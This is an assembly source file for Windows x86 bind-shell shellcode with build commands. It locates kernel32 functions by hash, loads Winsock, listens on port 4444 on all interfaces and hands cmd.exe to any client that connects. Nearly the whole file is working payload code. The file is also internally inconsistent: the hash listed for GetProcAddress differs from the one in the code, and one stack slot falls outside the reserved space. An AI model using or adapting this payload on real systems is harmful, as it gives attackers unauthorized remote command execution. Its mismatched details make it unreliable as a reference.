; ----------------------------------------------------------------------------
; Portbind shellcode: 0.0.0.0 address, 4444 port
; nasm -f win32 <file>.asm & gcc -o <file>.exe <file>.obj
;
;
; Function Name		Hash
; kernel32.dll
; CreateProcessA	0x16b3fe72		https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
; LoadLibraryA		0xec0e4e8e		https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
; ExitProcess		0x73e2d87e		https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess
; GetProcAddress	0x42e0c8ff		https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
;
; ws2_32.dll
; WSAStartup		0x3bfcedcb		https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
; WSASocketA		0xadf509d9		https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
; bind			0xc7701aa4		https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
; listen		0xe92eada4		https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen
; accept		0x498649e5		https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
; 
; 1. Create socket
; 2. Bind to a port
; 3. Listen on the port
; 4. Accept a client connection
; 5. Execute command interpreter
; 6. Exit the parent process
; ----------------------------------------------------------------------------

    global  _main

    section .text
_main:
	pushad
	pushfd
	push ebp
	mov ebp, esp
	jmp start
;=====================================
; Find kernel32.dll base
; kernel32.dll in high address space
; that's why we don't need to xor eax
;=====================================
find_kernel32:
    mov eax, [fs:0x30]		; PEB
    mov eax, [eax + 0x0c]	; PEB-Ldr
    mov eax, [eax + 0x14]	; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov eax, [eax]		; 2nd entry
    mov eax, [eax]		; 3rd entry
    mov eax, [eax + 0x10]	; address of kernel32.dll
    ret
;=====================================
;	Find function name
;=====================================
; 2 arguments: hash of function name, base of dll
;=====================================
find_function_name:
	xor esi, esi		; clear ESI register
	push ebp		; save old EBP
	mov ebp, esp		; new stack frame
	sub esp, 0xc		; 3 local variables: 12 bytes
	mov ebx, [ebp + 0x0C]	; save <>.dll absolute address in ebx
	mov ebx, [ebx + 0x3c]	; offset to New EXE Header
	add ebx, [ebp + 0x0C]	; absolute address to New EXE Header
	mov ebx, [ebx + 0x78]	; RVA of Export table
	add ebx, [ebp + 0x0C]	; Absolute address of Export table IMAGE_EXPORT_DIRECTORY
;=====================================
;	0x14 - Number of Functions
;	0x1c - Address Table RVA
;	0x20 - Name Pointer Table RVA
;	0x24 - Ordinal Table RVA
;=====================================
	mov eax, [ebx + 0x1c]	; RVA of Address Table
	add eax, [ebp + 0x0C]	; Absolute address of Address Table
	mov [ebp - 0x4], eax	; 1st local variable: base of Address Table
	
	mov eax, [ebx + 0x20]	; RVA of Name Pointer Table
	add eax, [ebp + 0x0C]	; Absolute address of Name Pointer Table
	mov [ebp - 0x8], eax	; 2nd local variable: base of Name Pointer Table
	
	mov eax, [ebx + 0x24]	; RVA of Ordinal Table
	add eax, [ebp + 0x0C]	; Absolute address of Ordinal table
	mov [ebp - 0x0C], eax	; 3rd local variable: base of Ordinal table

	mov ecx, [ebx + 0x14]	; Number of functions
	mov ebx, [ebp - 0x8]	; place address of Name Pointer Table

;=====================================
;	Fund function loop
;=====================================
find_function_loop:
	jecxz find_function_finished; if ecx = 0 => end
	dec ecx			; moving from Number of functions => 0
	mov esi, [ebx + 4*ecx]	; get RVA of next function name
	add esi, [ebp + 0x0C]	; base of function name

compute_hash:
	xor edi, edi
	xor eax, eax
compute_hash_again:
	lodsb			; load char of function name
	test al, al		; is it end of function name? \0
	jz compute_hash_finished; end
	ror edi, 0xd		; bitwise shift right
	add edi, eax
	jmp compute_hash_again
compute_hash_finished:
find_function_compare:
	cmp edi, [ebp + 0x8]	; compare our hash with calculated
	jnz find_function_loop
;=====================================
;	Get address of Function
;=====================================
	mov ebx, [ebp - 0x0c]	; get ordinal table base
	mov cx, [ebx + 2 * ecx]	; extract relative offset of function
	mov eax, [ebp - 0x4]	; get base of Address table
	mov eax, [eax + ecx*4]	; get RVA of our function
	add eax, [ebp + 0x0C]	; get base of our function
find_function_finished:
	leave			; mov esp, ebp; pop ebp
	ret

;=====================================
;	Start
;=====================================
start:
	sub esp, 0x28		; 40 bytes = 10 local variables
	; 0x4 		CreateProcessA 
	; 0x8		LoadLibraryA
	; 0x0C		ExitProcess
	; 0x10		GetProcAddress
	; 0x14		ws2_32.dll
	; 0x18		WSAStartup
	; 0x1c		WSASocketA
	; 0x20		bind 
	; 0x24		listen
	; 0x28		accept
;=====================================
; 	Find addresses of functions in kernel32.dll
;=====================================
	call find_kernel32	; find kernel32.dll
	push eax		; save address of kernel32.dll
	; CreateProcessA
	push 0x16b3fe72		; hash of CreateProcessA
	call find_function_name	; in EAX return value
	mov [ebp - 0x4], eax	; place into local address of CreateProcessA
	
	; LoadLibraryA
	mov eax, 0xec0e4e8e	; hash of LoadLibrary
	mov [esp], eax		; argument to find_function_name
	call find_function_name	; find LoadLibraryA in kernel32.dll
	mov [ebp - 0x8], eax	; save LoadLibrary address
	
	; ExitProcess
	mov eax, 0x73e2d87e	; hash of Exit Process
	mov [esp], eax		; argument to find_function_name
	call find_function_name	; find ExitProcess in kernel32.dll
	mov [ebp - 0x0C], eax	; save ExitProcess address
	
	; GetProcAddress 0x7c0dfcaa
	mov eax, 0x7c0dfcaa	; hash of GetProcAddress
	mov [esp], eax		; argument to find_function_name
	call find_function_name	; find GetProcAddress in kernel32.dll
	mov [ebp - 0x10], eax	; save GetProcAddress address
	
;=====================================
; 	Load ws2_32.dll
;=====================================
	push 0x00003233		; 32.dll
	push 0x5f327377		; ws2_
	mov ebx, esp		; place address in ebx
	push ebx		; pointer to string library
	call [ebp - 0x8]	; call LoadLibraryA
	
	;mov [esp+0x4], eax	; For searching by enumeration like in kernel32.dll
	mov [ebp - 0x14], eax	; save address of ws2_32.dll
	
;=====================================
; 	Find WSAStartup
;=====================================
	push 0x00007075		; Push WSAStartup
	push 0x74726174
	push 0x53415357
	mov ebx, esp
	push ebx		; pushed pointer to WSAStartup
	mov eax, [ebp - 0x14]	; address of ws2_32.dll
	push eax
	call [ebp - 0x10]	; call GetProcAddress
	mov [ebp - 0x18], eax	; save address of WSAStartup

;=====================================
;	Find WSASocketA
;=====================================
	push 0x00004174		; push WSASocketA
	push 0x656b636f
	push 0x53415357
	mov ebx, esp
	push ebx		; pointer to string function -> WSASocketA
	mov eax, [ebp - 0x14]	; address of ws2_32.dll
	push eax
	call [ebp - 0x10]	; call GetProcAddress
	mov [ebp - 0x1c], eax	; save address of WSASocketA
	
;=====================================
;	Find bind
;=====================================
	xor eax, eax
	push eax
	push 0x646e6962		; push bind
	mov ebx, esp
	push ebx
	mov eax, [ebp - 0x14]	; address of ws2_32.dll
	push eax		; pointer to address
	call [ebp - 0x10]	; GetProcAddress
	mov [ebp - 0x20], eax	; save address of ws2_32.bind

;=====================================
;	Find listen
;=====================================
	push 0x00006e65		; listen
	push 0x7473696c
	mov ebx, esp
	push ebx
	mov eax, [ebp - 0x14]	; address of ws2_32.dll
	push eax		; pointer to address
	call [ebp - 0x10]	; GetProcAddress
	mov [ebp - 0x24], eax	; save address of ws2_32.listen

;=====================================
;	Find accept
;=====================================
	push 0x00007470		; accept
	push 0x65636361
	mov ebx, esp
	push ebx
	mov eax, [ebp - 0x14]	; address of ws2_32.dll
	push eax		; pointer to address
	call [ebp - 0x10]	; GetProcAddress
	mov [ebp - 0x28], eax	; save address of ws2_32.accept
;=====================================
;	Call WSAStartup
;=====================================
	xor ecx, ecx
	mov cx, 400		; Create space for WSAdata structure.
	sub esp, ecx
	mov ebx, esp
	mov cx, 0x00000202	; version for WSAstartup
	push ebx
	push ecx
	call [ebp - 0x18]	; Call WSAStartup

;=====================================
;	Create Socket
;=====================================
	xor eax, eax
	push eax		; dwFlags
	push eax		; g
	push eax		; lpProtocolInfo
	push eax		; protocol
	inc eax
	push eax		; type = SOCK_STREAM = 1
	inc eax
	push eax		; af = AF_INET = 2
	call [ebp - 0x1c]	; call WSASocketA
	mov esi, eax		; save socket descriptor
	
;=====================================
;	Call Bind
;=====================================
	; creating sockaddr_in structure
	xor eax, eax
	push eax		; 0 - all interfaces
	push WORD 0x5c11	; 4444 port
	push WORD 2		; sin_family = AF_INET = 2
	mov ebx, esp		; set pointer to struct sockaddr_in

	xor eax, eax
	mov al, 0x10		; size of struct sockaddr_in
	push eax		; Push the namelen argument which has been set to 16.
	push ebx		; Push the name argument which has been set to the initialized struct sockaddr in on the stack.
	push esi		; socket descriptor
	call [ebp - 0x20]	; Call Bind


;=====================================
;	Call Listen
;=====================================
listen:
	push 0x10		; int backlog
	push esi		; socket
	call [ebp - 0x24]	; Listen
;=====================================
;	Call Accept
;=====================================
	xor ebx, ebx		; zero ebx
	mov ebx, 0x10		; place size of struct
	push ebx		; we need pointer to size
	mov edx, esp		; pointer to size
	sub esp, ebx		; a place for sockaddr in structure of client
	mov ecx, esp		; pointer to this place
	push edx
	push ecx
	push esi
	call [ebp - 0x28]	; call accept
	mov esi, eax		; save client descriptor
;=====================================
;	Call cmd.exe
;=====================================
	push 0x657865
	push 0x2e646d63		; cmd.exe
	mov [ebp - 0x2c], esp

	xor ecx, ecx		; zero ecx
	mov cl, 0x54		; size of STARTUPINFO
	sub esp, ecx		; allocate space for the two structures
	mov edi, esp		; set edi to point to STARTUPINFO structure
	push edi		; Preserve edi on the stack as it will be modified by the following instructions
	xor eax, eax		; Zero eax to for use with stosb to zero out the two structures.
	rep stosb		; Repeat storing zero at the buffer starting at edi until ecx is zero.
	pop edi			; restore eid
	mov byte [edi], 0x44	; Set the cb attribute of STARTUPINFO to 0x44 (the size of the structure).
	inc byte [edi + 0x2d]	; dwFlags: Set the STARTF USESTDHANDLES flag to indicate that the hStdInput, hStdOutput, and hStdError attributes should be used.
	push edi		; preserve edi again as it will be modified by the stosd
	mov eax, esi		; place socket descriptor into eax
	lea edi, [edi + 0x38]	; Load the effective address of the hStdInput attribute in the STARTUPINFO structure.
	stosd			; Set the hStdInput attribute to the file descriptor returned from WSASocket.
	stosd			; Set the hStdOutput attribute to the file descriptor returned from WSASocket.
	stosd			; Set the hStdError attribute to the file descriptor returned from WSASocket.
	pop edi			; Restore edi to its original value
	xor eax, eax
	lea esi, [edi + 0x44]	; Load the effective address of the PROCESS INFORMATION structure into esi.
	push esi		; Push the pointer to the lpProcessInformation structure.
	push edi		; Push the pointer to the lpStartupInfo structure.
	
	push eax		; Push the lpStartupDirectory argument as NULL.
	push eax		; Push the lpEnvironment argument as NULL.
	push eax		; Push the dwCreationFlags argument as 0.
	inc eax			
	push eax		; Push the bInheritHandles argument as TRUE due to the fact that the
				; client needs to inherit the socket file descriptor.
	dec eax
	push eax		; Push the lpThreadAttributes argument as NULL.
	push eax		; Push the lpProcessAttributes argument as NULL.
	
	mov eax, [ebp - 0x2c]
	push eax		; Push the lpCommandLine argument as the pointer to ’cmd’.
	xor eax, eax
	push eax		; Push the lpApplicationName argument as NULL.
	call [ebp - 0x4]	; Call CreateProcessA
	call [ebp - 0x0C]	; Call ExitProcess
	ret
